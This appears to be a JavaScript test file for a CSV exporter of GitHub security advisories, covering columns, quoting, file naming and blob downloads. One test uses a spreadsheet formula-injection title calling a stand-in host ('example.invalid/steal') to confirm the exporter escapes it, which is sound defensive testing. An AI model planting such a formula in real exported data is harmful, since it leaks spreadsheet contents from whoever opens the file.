'use strict';

const test = require('node:test');
const assert = require('node:assert');
const { parseHTML } = require('linkedom');

const schema = require('../src/common/schema.js');
const csv = require('../src/done/csv.js');

/**
 * @param {Partial<import('../src/common/parse-detail.js').ParsedDetail>} fields
 * @returns {import('../src/common/parse-detail.js').ParsedDetail}
 */
function advisory(fields) {
  return {
    ref: null,
    viewer: null,
    ghsaId: null,
    state: null,
    severity: null,
    severityLabel: null,
    severityClass: null,
    reportedAt: null,
    reporter: null,
    title: null,
    description: null,
    severityField: null,
    severityFieldPresent: false,
    cvssV3: null,
    cvssV3Present: false,
    cveId: null,
    cveSelection: null,
    descriptionOriginal: null,
    descriptionRevision: null,
    comments: [],
    timeline: [],
    fork: null,
    collaborators: [],
    ...fields,
  };
}

/**
 * @param {{ author: string, role: string, at: string | null, state?: Record<string, unknown> }} fields
 * @returns {import('../src/common/parse-detail.js').ParsedComment}
 */
function comment(fields) {
  const raw = fields.state === undefined ? null : JSON.stringify(fields.state);
  return {
    id: '1',
    elementId: 'advisory-comment-1',
    author: fields.author,
    role: fields.role,
    roles: [fields.role],
    trusted: fields.role === 'Member' || fields.role === 'Owner',
    at: fields.at,
    text: 'text',
    stateComment: raw === null ? null : schema.readSnapshot(raw),
  };
}

/**
 * @param {{
 *   ghsaId: string,
 *   state: string,
 *   title?: string | null,
 *   severity?: string | null,
 *   openedAt?: string | null,
 *   advisory?: import('../src/common/parse-detail.js').ParsedDetail | null,
 *   observedAt?: number | null,
 * }} fields
 * @returns {import('../src/done/corpus.js').CorpusMember}
 */
function member(fields) {
  const held = fields.advisory ?? null;
  return {
    ghsaId: fields.ghsaId,
    state: fields.state,
    seenAt: 0,
    advisory: held,
    observedAt: held === null ? null : (fields.observedAt ?? Date.parse('2026-08-27T09:00:00Z')),
    row: {
      ghsaId: fields.ghsaId,
      owner: 'containerd',
      repo: 'containerd',
      href: null,
      title: fields.title ?? null,
      state: fields.state,
      severity: fields.severity ?? null,
      severityLabel: null,
      severityClass: null,
      openedAt: fields.openedAt ?? null,
      reporter: null,
    },
  };
}

/**
 * @param {readonly import('../src/done/corpus.js').CorpusMember[]} members
 * @returns {import('../src/done/corpus.js').Corpus}
 */
function corpusOf(members) {
  return {
    members: [...members],
    unread: members.filter((entry) => entry.advisory === null).map((entry) => entry.ghsaId),
    complete: true,
    running: false,
    expected: { published: null, closed: null },
  };
}

/**
 * @param {string} text
 * @returns {string[]} the records, without the trailing empty one.
 */
function records(text) {
  const lines = text.split('\r\n');
  assert.strictEqual(lines.pop(), '', 'the file ends with a record separator');
  return lines;
}

test('the export carries one record per corpus member, under the columns', () => {
  const read = advisory({
    state: 'Published',
    severity: 'high',
    title: 'Path traversal in the drawer handler',
    reportedAt: '2026-05-04T14:00:00Z',
    comments: [
      comment({ author: 'samuelkarp', role: 'Member', at: '2026-05-04T14:30:00Z' }),
      comment({
        author: 'samuelkarp',
        role: 'Member',
        at: '2026-05-11T00:00:00Z',
        state: {
          betterGhsa: '1.0',
          seq: 1,
          by: 'samuelkarp',
          at: '2026-05-11T00:00:00Z',
          closure: { reason: 'fixed' },
        },
      }),
    ],
    timeline: [
      {
        id: 'event-1',
        actor: 'samuelkarp',
        at: '2026-05-04T15:00:00Z',
        text: 'samuelkarp accepted this report',
      },
      {
        id: 'event-2',
        actor: 'samuelkarp',
        at: '2026-05-05T14:00:00Z',
        text: 'samuelkarp closed this May 5, 2026',
      },
      {
        id: 'event-3',
        actor: 'samuelkarp',
        at: '2026-05-06T14:00:00Z',
        text: 'samuelkarp published this May 6, 2026',
      },
    ],
  });
  const text = csv.toCsv(
    corpusOf([
      member({ ghsaId: 'GHSA-aaaa-aaaa-aaaa', state: 'published', advisory: read }),
      member({
        ghsaId: 'GHSA-bbbb-bbbb-bbbb',
        state: 'closed',
        title: 'Only the list page has looked at this one',
        severity: 'low',
        openedAt: '2026-04-05T00:00:00Z',
      }),
    ])
  );

  const lines = records(text);
  assert.strictEqual(lines.length, 3, `records: ${lines.length}`);
  assert.strictEqual(
    lines[0],
    'ghsa_id,title,state,severity,closure_reason,reported_at,month,' +
      'time_to_first_response_ms,time_to_accept_ms,time_to_close_ms,time_to_publish_ms,' +
      'detail_fetched,observed_at'
  );
  assert.strictEqual(
    lines[1],
    'GHSA-aaaa-aaaa-aaaa,Path traversal in the drawer handler,published,high,fixed,' +
      '2026-05-04T14:00:00Z,2026-05,1800000,3600000,86400000,172800000,yes,' +
      '2026-08-27T09:00:00.000Z'
  );
  assert.strictEqual(
    lines[2],
    'GHSA-bbbb-bbbb-bbbb,Only the list page has looked at this one,closed,low,,' +
      '2026-04-05T00:00:00Z,2026-04,,,,,no,'
  );
});

test('a field carrying a separator, a quote, or a line break is quoted', () => {
  assert.strictEqual(csv.field('plain'), 'plain');
  assert.strictEqual(csv.field('one, two'), '"one, two"');
  assert.strictEqual(csv.field('a "quoted" word'), '"a ""quoted"" word"');
  assert.strictEqual(csv.field('first\r\nsecond'), '"first\r\nsecond"');
  assert.strictEqual(csv.field(null), '');
  assert.strictEqual(csv.field(0), '0');
});

test('a title a reporter wrote as a formula is exported as text', () => {
  // The reporter controls the title. Spreadsheet formulas must be escaped.
  const title = '=HYPERLINK("https://example.invalid/steal?c="&A1,"click")';
  assert.strictEqual(csv.field(title), `"'${title.replace(/"/g, '""')}"`);
  for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
    assert.strictEqual(csv.field(`${lead}x`), `"'${lead}x"`, `a field opening with ${lead}`);
  }

  const text = csv.toCsv(
    corpusOf([member({ ghsaId: 'GHSA-cccc-cccc-cccc', state: 'closed', title })])
  );
  const line = /** @type {string} */ (records(text)[1]);
  assert.ok(line.includes(`,"'=HYPERLINK`), `the exported record: ${line}`);
  assert.ok(!line.includes(',=HYPERLINK'), 'no field reaches the file as a formula');
});

test('the file is named for the repository and the day', () => {
  assert.strictEqual(
    csv.filenameFor({ owner: 'containerd', repo: 'containerd' }, Date.parse('2026-08-27T23:30:00Z')),
    'containerd-containerd-advisories-2026-08-27.csv'
  );
});

test('the download is a blob made in the page, taken by a synthetic anchor', async () => {
  const doc = /** @type {Document} */ (
    /** @type {unknown} */ (parseHTML('<!doctype html><html><body></body></html>').document)
  );

  /** @type {string[]} */
  const made = [];
  /** @type {string[]} */
  const dropped = [];
  /** @type {{ href: string | null, download: string | null, inDocument: boolean }[]} */
  const pressed = [];
  doc.body.addEventListener('click', (event) => {
    const node = /** @type {Element} */ (event.target);
    pressed.push({
      href: node.getAttribute('href'),
      download: node.getAttribute('download'),
      inDocument: doc.body.contains(node),
    });
  });

  /** @type {{ parts: unknown[], type: unknown }[]} */
  const blobs = [];
  class FakeBlob {
    /**
     * @param {unknown[]} parts
     * @param {{ type?: string }} [options]
     */
    constructor(parts, options) {
      blobs.push({ parts, type: options?.type ?? null });
    }
  }

  const text = 'ghsa_id\r\nGHSA-aaaa-aaaa-aaaa\r\n';
  const url = csv.download(doc, 'corpus.csv', text, {
    Blob: /** @type {typeof globalThis.Blob} */ (/** @type {unknown} */ (FakeBlob)),
    createObjectURL: () => {
      const made_url = `blob:https://github.com/${made.length}`;
      made.push(made_url);
      return made_url;
    },
    revokeObjectURL: (each) => dropped.push(each),
  });

  assert.strictEqual(url, 'blob:https://github.com/0');
  assert.deepStrictEqual(blobs.length, 1, 'one blob, made here in the page');
  assert.deepStrictEqual(blobs[0]?.parts, [text], 'the blob carries the file');
  assert.strictEqual(blobs[0]?.type, csv.MIME);
  assert.deepStrictEqual(pressed, [
    { href: 'blob:https://github.com/0', download: 'corpus.csv', inDocument: true },
  ]);
  assert.strictEqual(doc.querySelectorAll('a[download]').length, 0, 'the anchor is taken out');

  assert.deepStrictEqual(dropped, [], 'the URL outlives the press');
  await new Promise((resolve) => setTimeout(resolve, 0));
  assert.deepStrictEqual(dropped, ['blob:https://github.com/0'], 'and is released after it');
});

test('a page with nowhere to press leaves no blob URL behind', () => {
  /** @type {string[]} */
  const made = [];
  /** @type {string[]} */
  const dropped = [];
  const nowhere = /** @type {Document} */ (
    /** @type {unknown} */ ({
      body: null,
      documentElement: null,
      /** @param {string} tag */
      createElement: (tag) => {
        throw new Error(`nothing should have been built: ${tag}`);
      },
    })
  );

  const url = csv.download(nowhere, 'corpus.csv', 'ghsa_id\r\n', {
    Blob: /** @type {typeof globalThis.Blob} */ (/** @type {unknown} */ (class {})),
    createObjectURL: () => {
      made.push('blob:https://github.com/leaked');
      return 'blob:https://github.com/leaked';
    },
    revokeObjectURL: (each) => dropped.push(each),
  });

  assert.strictEqual(url, null, 'a file was reported handed over');
  assert.deepStrictEqual(made, [], 'a blob URL nothing can release was made');
  assert.deepStrictEqual(dropped, [], 'and nothing was released, because nothing was made');
});
